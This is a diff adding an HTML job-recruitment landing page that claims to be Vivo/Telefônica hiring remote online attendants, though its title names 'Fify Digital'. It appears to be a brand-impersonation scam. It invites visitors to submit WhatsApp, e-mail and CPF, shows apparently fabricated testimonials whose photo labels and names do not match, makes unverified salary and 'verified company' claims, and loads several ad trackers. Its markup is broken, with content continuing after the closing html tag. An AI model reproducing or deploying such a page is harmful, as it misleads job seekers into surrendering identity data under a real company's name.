@@ -1,0 +1,540 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Fify Digital – Vagas Abertas</title>
+  <!-- Tailwind CSS via CDN -->
+  <script src="https://cdn.tailwindcss.com"></script>
+
+  <!-- jQuery + Mask Plugin -->
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
+
+  <style>
+    @keyframes waveSlide {
+      0% { transform: translateX(0); }
+      100% { transform: translateX(-50%); }
+    }
+    .animate-wave-move {
+      display: flex;
+      animation: waveSlide 8s linear infinite;
+    }
+
+    @keyframes fadeInOverlay {
+      from { opacity: 0; }
+      to   { opacity: 1; }
+    }
+    @keyframes slideUpModal {
+      from { transform: translateY(30px); opacity: 0; }
+      to   { transform: translateY(0);    opacity: 1; }
+    }
+    .animate-fade-in-overlay {
+      animation: fadeInOverlay 0.3s ease-out forwards;
+    }
+    .animate-slide-up-modal {
+      animation: slideUpModal 0.4s ease-out forwards;
+    }
+  </style>
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '626607453724332');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=626607453724332&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+<script>
+  window.pixelId = "68378463cbf7e2d2b03bad5f";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+
+<script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+
+<script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "rqs6jaszdp");
+</script>
+</head>
+<body class="font-sans text-gray-900">
+
+  <!-- HERO -->
+  <header class="relative overflow-hidden">
+    <!-- fundo com imagem entortado -->
+    <div
+      class="absolute inset-0 bg-cover bg-center transform -skew-y-6 origin-top-left"
+      style="background-image: url('./images/a-vivo_nossa-historia_destaque_mobile.jpg');"
+    ></div>
+
+    <!-- conteúdo desenrotado -->
+    <div class="relative container mx-auto px-4 text-center max-w-3xl py-16 text-white">
+      <h1 class="text-3xl md:text-4xl font-bold mb-4">
+        Vivo está com <span class="uppercase">VAGAS ABERTAS</span><br>
+        para atendente online – trabalhe de casa ainda hoje!
+      </h1>
+      <p class="mb-8">Sem experiência • Treinamento gratuito • Contrato CLT ou freelancer</p>
+
+      <!-- FORMULÁRIO ATUALIZADO -->
+      <form id="cpfForm"
+            action="analise/resultado.html"
+            method="GET"
+            class="bg-white rounded-lg p-6 shadow-lg mx-auto max-w-sm">
+        <h2 class="text-xl font-bold mb-4">Quero fazer parte da seleção</h2>
+        <input
+          type="text"
+          name="whatsapp"
+          placeholder="WhatsApp"
+          required
+          class="w-full mb-3 p-2 border rounded text-gray-800 placeholder-gray-500"
+        >
+        <input
+          type="email"
+          name="email"
+          placeholder="E-mail"
+          required
+          class="w-full mb-3 p-2 border rounded text-gray-800 placeholder-gray-500"
+        >
+        <input
+          type="text"
+          id="cpf"
+          name="cpf"
+          placeholder="000.000.000-00"
+          required
+          class="w-full mb-4 p-2 border rounded text-gray-800 placeholder-gray-500"
+        >
+        <button
+          type="submit"
+          class="w-full bg-blue-600 text-white py-3 rounded font-semibold hover:bg-blue-700 transition"
+        >
+          ENVIAR
+        </button>
+      </form>
+      <!-- FIM DO FORMULÁRIO -->
+
+      <div class="mt-10 relative z-10 flex justify-around text-sm text-white font-semibold">
+  <span class="flex items-center">
+    <span class="w-2 h-2 bg-white rounded-full inline-block mr-2"></span>
+    Empresa Verificada
+  </span>
+  <span class="flex items-center">
+    <span class="w-2 h-2 bg-white rounded-full inline-block mr-2"></span>
+    100% Remoto
+  </span>
+  <span class="flex items-center">
+    <span class="w-2 h-2 bg-white rounded-full inline-block mr-2"></span>
+    Vagas Ilimitadas
+  </span>
+</div>
+
+
+ 
+</div>
+
+
+  <!-- Popup aprimorado (sem alterações) -->
+  <div id="popup-confirm" class="fixed inset-0 bg-black bg-opacity-60 flex items-center justify-center z-50 hidden animate-fade-in-overlay">
+    <div class="bg-white w-full max-w-lg mx-4 p-8 rounded-2xl shadow-2xl transform scale-95 animate-slide-up-modal">
+      <div class="flex flex-col items-center mb-6">
+        <span class="text-red-600 text-4xl mb-2 animate-bounce">⚠️</span>
+        <h2 class="text-2xl font-bold text-gray-800">Atenção</h2>
+      </div>
+      <p class="text-gray-700 text-center mb-8 leading-relaxed">
+        Antes de prosseguir, leia atentamente toda a página<br>
+        e assista ao vídeo com atenção.
+      </p>
+      <div class="flex justify-center gap-6">
+        <button
+          onclick="document.getElementById('popup-confirm').classList.add('hidden')"
+          class="bg-blue-600 text-white font-semibold px-6 py-3 rounded-lg shadow-md hover:bg-blue-700 transform hover:-translate-y-1 transition"
+        >
+          PROSSEGUIR
+        </button>
+        <button
+          onclick="document.getElementById('popup-confirm').classList.add('hidden')"
+          class="bg-gray-200 text-gray-800 font-semibold px-6 py-3 rounded-lg shadow-sm hover:bg-gray-300 transform hover:-translate-y-1 transition"
+        >
+          LER ATENTAMENTE
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Aplique a máscara no CPF -->
+  <script>
+    $('#cpf').mask('000.000.000-00');
+  </script>
+
+</body>
+</html>
+
+
+  </div>
+</div>
+
+  </div>
+</div>
+
+</div>
+
+      </form>
+      
+   
+
+
+  </header>
+  
+  
+
+  <!-- POR QUE TRABALHAR CONOSCO --> 
+  <section class="py-16">
+
+    <div class="container mx-auto px-4 flex flex-col md:flex-row items-center gap-12">
+      <!-- Ícones + texto -->
+      <div class="grid grid-cols-1 sm:grid-cols-3 gap-8 flex-1 text-center">
+        <div>
+         <div class="grid grid-cols-1 sm:grid-cols-2 gap-6">
+  
+  <section class="py-16 bg-gray-50">
+  <div class="container mx-auto px-4">
+    <!-- Título -->
+    <div class="text-center mb-12">
+      <h2 class="text-3xl font-bold text-gray-800">Benefícios de Trabalhar Conosco</h2>
+      <p class="text-gray-600 mt-2">Descubra as vantagens exclusivas que oferecemos aos nossos colaboradores</p>
+    </div>
+
+    <!-- Grid de Cards -->
+    <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-8">
+      
+      <div class="flex items-start gap-4 p-6 bg-white rounded-lg shadow-lg hover:shadow-2xl transition-shadow duration-300">
+        <img src="./images/icon-cellphone-tablet-notebook.2fd3b2df.svg" alt="Trabalho Home Office" class="w-12 h-12">
+        <div>
+          <h3 class="font-semibold text-lg text-gray-800 mb-1">Trabalho Home Office</h3>
+          <p class="text-gray-600 text-sm">Flexibilidade para trabalhar de onde estiver, com todo o suporte e tecnologia necessários.</p>
+        </div>
+      </div>
+
+      <div class="flex items-start gap-4 p-6 bg-white rounded-lg shadow-lg hover:shadow-2xl transition-shadow duration-300">
+        <img src="./images/icon-notebook.c81cc395.svg" alt="Treinamento incluído" class="w-12 h-12">
+        <div>
+          <h3 class="font-semibold text-lg text-gray-800 mb-1">Treinamento incluído</h3>
+          <p class="text-gray-600 text-sm">Programas de capacitação contínua para desenvolvimento da sua carreira.</p>
+        </div>
+      </div>
+
+      <div class="flex items-start gap-4 p-6 bg-white rounded-lg shadow-lg hover:shadow-2xl transition-shadow duration-300">
+        <img src="./images/icon-wifi.de8c1256.svg" alt="Planos de Wi-fi inclusos" class="w-12 h-12">
+        <div>
+          <h3 class="font-semibold text-lg text-gray-800 mb-1">Planos de Wi-fi inclusos</h3>
+          <p class="text-gray-600 text-sm">Conexão de alta velocidade fornecida pela empresa para manter você sempre online.</p>
+        </div>
+      </div>
+
+      <div class="flex items-start gap-4 p-6 bg-white rounded-lg shadow-lg hover:shadow-2xl transition-shadow duration-300">
+        <img src="./images/icon-cellphone-tag.9e75c213.svg" alt="Descontos em aparelhos" class="w-12 h-12">
+        <div>
+          <h3 class="font-semibold text-lg text-gray-800 mb-1">Descontos em aparelhos</h3>
+          <p class="text-gray-600 text-sm">Acesso a ofertas exclusivas em smartphones, tablets e acessórios Vivo.</p>
+        </div>
+      </div>
+
+      <div class="flex items-start gap-4 p-6 bg-white rounded-lg shadow-lg hover:shadow-2xl transition-shadow duration-300">
+        <img src="./images/icon-cellphone-5g.60b12489.svg" alt="Tecnologia 5G ilimitada" class="w-12 h-12">
+        <div>
+          <h3 class="font-semibold text-lg text-gray-800 mb-1">Tecnologia 5G ilimitada</h3>
+          <p class="text-gray-600 text-sm">Acesse a internet mais rápida do Brasil sem se preocupar com franquias.</p>
+        </div>
+      </div>
+
+    </div>
+  </div>
+</section>
+
+ 
+
+</div>
+
+      </div>
+      <!-- Vídeo -->
+      <div class="flex-1">
+        <video src="video/Vem Realizar com a gente.mp4" controls class="w-full rounded-lg shadow-lg"></video>
+      </div>
+    </div>
+
+    <!-- Imagem com texto abaixo do vídeo -->
+    <div class="container mx-auto px-4 mt-12 flex flex-col md:flex-row items-center">
+      <div class="md:w-3/4 lg:w-2/3 mx-auto">
+  <div class="md:w-full lg:w-3/4 mx-auto">
+  <img
+    src="images/vivo-empresa-equipamento-rede-cisco-943x832 (1).svg"
+    alt="Descrição da imagem"
+    class="w-full rounded-lg shadow-lg transform scale-110"
+  />
+</div>
+
+
+      <div class="md:w-1/2 md:pl-8 mt-6 md:mt-0 text-black">
+        <h3 class="text-2xl font-bold mb-4">Quem Somos</h3>
+        <p class="text-gray-700 leading-relaxed">
+  Somos uma empresa do Grupo Telefônica, líder em telecomunicações no Brasil. Trabalhamos com o propósito de 
+  <span class="text-purple-600 font-semibold">Digitalizar para Aproximar pessoas</span>, 
+  <span class="text-purple-600 font-semibold">negócios e toda sociedade</span>, construindo uma nação mais conectada e transformando a vida dos brasileiros. 
+  Buscamos ampliar a autonomia, a personalização e as escolhas em tempo real dos nossos clientes, colocando-os no comando da sua <span class="text-purple-600 font-semibold">vida digital</span> 
+  com segurança e confiabilidade – tudo isso com a qualidade que só a Vivo tem.
+</p>
+
+
+  </section>
+
+  
+
+  <!-- DEPOIMENTOS -->
+   
+  <!-- Onda cobrindo depoimentos + FAQ + footer -->
+<section class="relative bg-gradient-to-b from-purple-600 to-purole-500 pt-6 pb-26 overflow-hidden">
+  <!-- Onda branca animada no topo -->
+  <div class="absolute top-0 left- w-full">
+    <svg class="w-full h-32" viewBox="0 0 1440 320" preserveAspectRatio="none">
+      <path fill="#ffffff" fill-opacity="1">
+        <animate attributeName="d" dur="200000000s" repeatCount="indefinite" values="
+          M0,160L60,154.7C120,149,240,139,360,122.7C480,107,600,85,720,106.7C840,128,960,192,1080,197.3C1200,203,1320,149,1380,122.7L1440,96V0H0Z;
+          M0,180L8060C160,140,320,100,480,120C640,140,800,200,960,190C1120,180,1280,100,1360,80L1440,60V0H0Z;
+          M160L60,154.7C120,149,240,139,360,122.7C480,107,600,85,720,106.7C840,128,960,192,1080,197.3C1200,203,1320,149,1380,122.7L1440,96V0H0Z
+        " />
+     
+      </path>
+    </svg>
+
+  </div>
+
+
+
+  <div class="relative z-10">
+   <!-- DEPOIMENTOS EM CARROSSEL -->
+<section class="py-16">
+  <div class="container mx-auto px-4 text-center max-w-2xl text-white">
+    <h2 class="text-2xl font-bold mb-8">Depoimentos de quem já treinamos</h2>
+
+   <div class="relative overflow-hidden">
+  <div class="flex transition-transform duration-500 ease-in-out" id="testimonial-carousel">
+    
+    <!-- Slide 1 -->
+    <div class="min-w-full px-4">
+      <img src="images/foto1 (1).jpg" alt="Luana C." class="w-17 h-17 rounded-full mx-auto mb-4"/>
+      <h4 class="font-semibold text-black">Pedro U.</h4>
+      <p class="text-sm text-gray-700">Belo Horizonte</p>
+      <p class="mt-2 text-gray-800 text-sm">
+        “Entrar para o call center da Vivo foi um divisor de águas na minha carreira. Eu esperava um salário mediano, mas recebo muito mais do que imaginei, além de benefícios completos—plano de saúde, vale-refeição e descontos em produtos Vivo. Hoje me sinto valorizada e com estabilidade financeira para realizar meus sonhos.”
+      </p>
+    </div>
+
+    <!-- Slide 2 -->
+    <div class="min-w-full px-4">
+      <img src="images/foto1 (2).jpg" alt="Marcos A." class="w-17 h-17 rounded-full mx-auto mb-4"/>
+      <h4 class="font-semibold text-black">Marcos A.</h4>
+      <p class="text-sm text-gray-700">São Paulo</p>
+      <p class="mt-2 text-gray-800 text-sm">
+        “Antes da Vivo, eu trabalhava em um lugar sem perspectiva de crescimento. Aqui, além de um salário acima da média do mercado, recebo comissões por metas atingidas e acesso a treinamentos constantes. Isso mudou minha vida: hoje tenho planos de crescer dentro da empresa e até investir em um curso de especialização.”
+      </p>
+    </div>
+
+    <!-- Slide 3 -->
+    <div class="min-w-full px-4">
+      <img src="images/foto1 (3).jpg" alt="Ana P." class="w-17 h-17 rounded-full mx-auto mb-4"/>
+      <h4 class="font-semibold text-black">Lorenzo E.</h4>
+      <p class="text-sm text-gray-700">Rio de Janeiro</p>
+      <p class="mt-2 text-gray-800 text-sm">
+        “O pacote de benefícios da Vivo é surpreendente: assistência odontológica, auxílio home office e até programa de bem-estar. Meu rendimento mensal aumentou em mais de 30% comparado ao último emprego. Trabalhar aqui me deu a segurança para planejar a compra da minha casa própria.”
+      </p>
+    </div>
+
+    <!-- Slide 4 -->
+    <div class="min-w-full px-4">
+      <img src="images/foto1 (4).jpg" alt="Sofia T." class="w-17 h-17 rounded-full mx-auto mb-4"/>
+      <h4 class="font-semibold text-black">Sofia T.</h4>
+      <p class="text-sm text-gray-700">Rio de Janeiro</p>
+      <p class="mt-2 text-gray-800 text-sm">
+        “Entrei como trainee e, em poucos meses, já fui promovido a líder de equipe. Além do salário fixo competitivo, tenho bonificações por desempenho e participação nos lucros. Agradeço à Vivo por me proporcionar um ambiente que incentiva o crescimento profissional e pessoal.”
+      </p>
+    </div>
+
+    <!-- Slide 5 -->
+    <div class="min-w-full px-4">
+      <img src="images/foto1 (5).jpg" alt="Ana P." class="w-17 h-17 rounded-full mx-auto mb-4"/>
+      <h4 class="font-semibold text-black">Ana P.</h4>
+      <p class="text-sm text-gray-700">Rio de Janeiro</p>
+      <p class="mt-2 text-gray-800 text-sm">
+        “O que mais me surpreendeu foi a cultura de valorização do colaborador. Eu recebo muita flexibilidade de horário, suporte psicológico e incentivo para fazer cursos externos. Minha qualidade de vida melhorou drasticamente, e hoje me sinto parte de uma grande família.”
+      </p>
+    </div>
+
+  </div>
+</div>
+
+      </div>
+
+      <!-- Botões de navegação -->
+      <button id="prev" class="absolute top-1/2 left-2 transform -translate-y-1/2 bg-white p-2 rounded-full shadow-lg">
+        ‹
+      </button>
+      <button id="next" class="absolute top-1/2 right-2 transform -translate-y-1/2 bg-white p-2 rounded-full shadow-lg">
+        ›
+      </button>
+    </div>
+  </div>
+</section>
+
+<script>
+  const carousel = document.getElementById('testimonial-carousel');
+  const prevBtn  = document.getElementById('prev');
+  const nextBtn  = document.getElementById('next');
+  let index = 0;
+  const total = carousel.children.length;
+
+  function updateCarousel() {
+    carousel.style.transform = `translateX(-${index * 100}%)`;
+  }
+
+  prevBtn.addEventListener('click', () => {
+    index = (index - 1 + total) % total;
+    updateCarousel();
+  });
+
+  nextBtn.addEventListener('click', () => {
+    index = (index + 1) % total;
+    updateCarousel();
+  });
+</script>
+
+    
+   
+    </section>
+
+    <!-- FAQ -->
+    <section class="py-16">
+      <div class="container mx-auto px-4 max-w-2xl text-black">
+        <h2 class="text-2xl font-bold text-center mb-8">Perguntas frequentes</h2>
+        <div class="space-y-4">
+
+<details class="border rounded-lg p-4 bg-white">
+  <summary class="cursor-pointer font-medium">O que preciso ter para participar?</summary>
+  <p class="mt-2 text-gray-700">Basta um smartphone ou computador com conexão de internet estável. É tudo que você precisa!</p>
+</details>
+<details class="border rounded-lg p-4 bg-white">
+  <summary class="cursor-pointer font-medium">Preciso ter experiência prévia?</summary>
+  <p class="mt-2 text-gray-700">Não. Oferecemos treinamento completo e suporte contínuo para você se desenvolver desde o primeiro dia.</p>
+</details>
+<details class="border rounded-lg p-4 bg-white">
+  <summary class="cursor-pointer font-medium">Posso trabalhar de casa?</summary>
+  <p class="mt-2 text-gray-700">Sim! Nossa operação é 100% remota, permitindo que você trabalhe no conforto do seu lar com total flexibilidade.</p>
+</details>
+<details class="border rounded-lg p-4 bg-white">
+  <summary class="cursor-pointer font-medium">Como funciona a jornada de trabalho?</summary>
+  <p class="mt-2 text-gray-700">Você escolhe: oferecemos opções de meio-período ou jornada integral, para se adequar à sua rotina.</p>
+</details>
+<details class="border rounded-lg p-4 bg-white">
+  <summary class="cursor-pointer font-medium">Quais benefícios receberei?</summary>
+  <p class="mt-2 text-gray-700">Internet subsidiada, descontos exclusivos em produtos Vivo, treinamentos contínuos e apoio ao seu crescimento profissional.</p>
+</details>
+<details class="border rounded-lg p-4 bg-white">
+  <summary class="cursor-pointer font-medium">Há algum custo para participar?</summary>
+  <p class="mt-2 text-gray-700">Nenhum custo! Todo o processo seletivo e o treinamento são 100% gratuitos.</p>
+</details>
+<details class="border rounded-lg p-4 bg-white">
+  <summary class="cursor-pointer font-medium">Qual é a remuneração?</summary>
+  <p class="mt-2 text-gray-700">Salário fixo competitivo, com possibilidade de bônus por desempenho, podendo ultrapassar R$ 3.800 mensais.</p>
+</details>
+
+
+</div>
+      </div>
+    </section>
+
+    <!-- Fecha o container antes do footer -->
+</div> 
+
+<!-- Rodapé no estilo Vivo full-width -->
+<footer class="w-full bg-gray-50 text-gray-800">
+  <div class="container mx-auto px-4 py-10">
+    <!-- Links + ícones sociais -->
+    <div class="flex flex-col md:flex-row md:justify-between">
+      
+      <!-- Lista de links -->
+      <ul class="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-4 gap-x-8 gap-y-2 text-sm">
+        <li><a href="#" class="hover:underline">Telefones de atendimento</a></li>
+        <li><a href="#" class="hover:underline">Fale Conosco</a></li>
+        <li><a href="#" class="hover:underline">Comunicados</a></li>
+        <li><a href="#" class="hover:underline">Contratos e Regulamentos</a></li>
+        <li><a href="#" class="hover:underline">Ouvidoria</a></li>
+        <li><a href="#" class="hover:underline">A Vivo</a></li>
+        <li><a href="#" class="hover:underline">Carreiras</a></li>
+        <li><a href="#" class="hover:underline">Telefônica Brasil</a></li>
+        <li><a href="#" class="hover:underline">Acessibilidade</a></li>
+        <li><a href="#" class="hover:underline">Conselhos de usuários</a></li>
+        <li><a href="#" class="hover:underline">Código de Defesa do Consumidor</a></li>
+      </ul>
+      
+      <!-- Ícones sociais -->
+      <div class="flex space-x-4 mt-6 md:mt-0">
+        <a href="#" aria-label="Facebook" class="hover:opacity-75">
+          <img src="./images/facebook.png" alt="Facebook" class="w-6 h-6">
+        </a>
+        <a href="#" aria-label="Instagram" class="hover:opacity-75">
+          <img src="./images/instagram.png" alt="Instagram" class="w-6 h-6">
+        </a>
+        <a href="#" aria-label="YouTube" class="hover:opacity-75">
+          <img src="./images/youtube.png" alt="YouTube" class="w-6 h-6">
+        </a>
+        <a href="#" aria-label="X" class="hover:opacity-75">
+          <img src="./images/twitter.png" alt="X" class="w-6 h-6">
+        </a>
+      </div>
+    </div>
+
+    <!-- Copyright e links auxiliares -->
+    <div class="border-t border-gray-300 mt-8 pt-4 text-xs flex flex-col md:flex-row justify-between items-center">
+      <span>Copyright 2025 © Vivo. Todos os direitos reservados.</span>
+      <div class="space-x-4 mt-2 md:mt-0">
+        <a href="#" class="hover:underline">Política de Privacidade</a>
+        <a href="#" class="hover:underline">Decreto 6.532/2008</a>
+      </div>
+    </div>
+
+       <!-- Tagline -->
+    <div class="mt-4 text-xs text-center">
+      <span class="font-semibold uppercase">VIVA TUDO</span><br>
+      5G, Ultra Banda Larga, HDTV, Voz e mais.
+    </div>
+    <!-- Imagem abaixo da tagline -->
+    <div class="mt-6 text-center">
+      <img src="./images/footer-viva-tudo-808x480.svg" alt="Por que escolher a Vivo" class="mx-auto w-82 md:w-82">
+    </div>
+  </div>
+
+</footer>
+
+
+
